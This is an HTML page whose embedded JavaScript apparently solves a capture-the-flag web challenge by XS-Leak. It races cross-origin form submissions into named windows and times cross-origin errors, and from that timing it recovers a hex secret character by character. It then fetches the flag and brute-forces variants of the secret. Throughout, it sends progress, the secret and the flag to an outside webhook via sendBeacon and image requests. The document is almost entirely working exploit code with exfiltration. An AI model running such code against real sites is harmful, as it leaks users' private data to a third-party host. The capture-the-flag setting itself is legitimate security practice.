<!DOCTYPE html>
<html>
<head><title>XS-Leak Parallel Race</title></head>
<body>
<div id="s">Loading...</div>
<script>
var TARGET = "https://append-note-lcpbp.instancer.lac.tf";
var WEBHOOK = "https://wild-cat-98.webhook.cool";
var CHARS = "0123456789abcdef";

function report(msg) {
    navigator.sendBeacon(WEBHOOK, msg);
    new Image().src = WEBHOOK + "?m=" + encodeURIComponent(msg);
}

report("RACE_V2");

// Race all 16 chars in parallel - first to complete wins
function racePosition(prefix) {
    return new Promise(function(resolve) {
        var results = [];
        var pending = CHARS.length;
        var intervals = [];
        var timeouts = [];
        
        for (var i = 0; i < CHARS.length; i++) {
            (function(c, idx) {
                var wname = "r" + idx + "_" + Date.now();
                var url = TARGET + "/append?content=" + encodeURIComponent(prefix + c) + "&url=" + encodeURIComponent(TARGET + "/?_=" + Math.random());
                
                var form = document.createElement("form");
                form.method = "GET";
                form.action = url;
                form.target = wname;
                document.body.appendChild(form);
                
                var startTime = performance.now();
                form.submit();
                document.body.removeChild(form);
                
                // Poll for cross-origin error
                var iv = setInterval(function() {
                    try {
                        var w = window.open("", wname);
                        if (w) {
                            try {
                                var loc = w.location.href;
                                // Still accessible = not loaded yet or same origin
                            } catch(e) {
                                // Cross-origin = page loaded
                                clearInterval(iv);
                                var elapsed = performance.now() - startTime;
                                results.push({ c: c, time: elapsed, order: results.length });
                                try { w.close(); } catch(x) {}
                                pending--;
                                if (pending === 0) resolve(results);
                            }
                        }
                    } catch(e) {
                        clearInterval(iv);
                        var elapsed = performance.now() - startTime;
                        results.push({ c: c, time: elapsed, order: results.length });
                        pending--;
                        if (pending === 0) resolve(results);
                    }
                }, 5);
                intervals.push(iv);
                
                // Timeout
                var to = setTimeout(function() {
                    clearInterval(iv);
                    if (!results.some(function(r) { return r.c === c; })) {
                        results.push({ c: c, time: 9999, order: results.length });
                        pending--;
                        if (pending === 0) resolve(results);
                    }
                }, 8000);
                timeouts.push(to);
                
            })(CHARS[i], i);
        }
    });
}

async function trySecret(secret) {
    try {
        var resp = await fetch(TARGET + "/flag?secret=" + secret);
        var text = await resp.text();
        if (text.indexOf("lactf") !== -1) {
            report("FLAG=" + text);
            document.getElementById("s").textContent = text;
            return true;
        }
    } catch(e) {}
    return false;
}

async function main() {
    report("START");
    document.getElementById("s").textContent = "Racing...";
    
    try {
        var secret = "";
        
        for (var pos = 0; pos < 8; pos++) {
            document.getElementById("s").textContent = "P" + pos + ": " + secret + "_";
            
            var results = await racePosition(secret);
            
            // Sort by finish order (first to complete)
            results.sort(function(a, b) { return a.order - b.order; });
            
            // Report top 3 finishers
            var top3 = results.slice(0, 3).map(function(r) {
                return r.c + ":" + Math.round(r.time) + "#" + r.order;
            }).join(",");
            report("P" + pos + ":" + top3);
            
            // Take first to finish as winner
            secret += results[0].c;
        }
        
        report("SECRET=" + secret);
        
        // Try the secret
        if (await trySecret(secret)) return;
        
        // Bruteforce variations
        report("BRUTE");
        for (var pos = 0; pos < 8; pos++) {
            for (var i = 0; i < CHARS.length; i++) {
                var c = CHARS[i];
                if (secret[pos] === c) continue;
                var variant = secret.substr(0, pos) + c + secret.substr(pos + 1);
                if (await trySecret(variant)) return;
            }
        }
        
        report("NOFLAG");
        
    } catch(e) {
        report("ERR=" + e.message);
    }
}

main();
</script>
</body>
</html>
